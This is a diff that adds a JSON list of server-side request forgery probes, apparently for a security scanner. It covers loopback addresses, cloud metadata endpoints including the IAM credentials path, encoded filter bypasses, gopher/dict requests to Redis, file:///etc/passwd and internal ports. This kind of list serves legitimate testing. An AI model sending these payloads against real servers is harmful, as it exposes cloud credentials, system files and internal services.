@@ -1,0 +1,36 @@
+{
+  "name": "ssrf",
+  "说明": "SSRF 探针。带外回连地址留空由使用者替换 <CALLBACK>，不要默认外发。",
+  "sets": {
+    "loopback": [
+      "http://127.0.0.1/",
+      "http://127.0.0.1:80/",
+      "http://localhost/",
+      "http://0.0.0.0/",
+      "http://[::1]/"
+    ],
+    "metadata": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "http://100.100.100.200/latest/meta-data/",
+      "http://metadata.google.internal/computeMetadata/v1/"
+    ],
+    "bypass": [
+      "http://2130706433/",
+      "http://0x7f000001/",
+      "http://127.1/",
+      "http://①②⑦.0.0.1/",
+      "http://127.0.0.1.nip.io/",
+      "dict://127.0.0.1:6379/info",
+      "gopher://127.0.0.1:6379/_INFO",
+      "file:///etc/passwd"
+    ],
+    "internal_ports": [
+      "http://127.0.0.1:8080/",
+      "http://127.0.0.1:9200/",
+      "http://127.0.0.1:6379/",
+      "http://127.0.0.1:8500/v1/status/leader"
+    ]
+  },
+  "pairs": {}
+}
